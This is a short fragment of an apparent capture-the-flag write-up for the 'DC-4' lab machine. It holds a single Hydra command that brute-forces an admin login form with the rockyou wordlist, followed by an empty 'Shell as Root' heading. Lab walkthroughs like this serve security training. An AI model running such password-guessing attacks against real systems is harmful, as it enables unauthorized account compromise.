# DC-4 - Hydra

## Find admin creds

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -f 192.168.248.195 http-post-form "/login.php:username=^USER^&password=^PASS^::S=Logout"
```

[image]

## Shell as Root
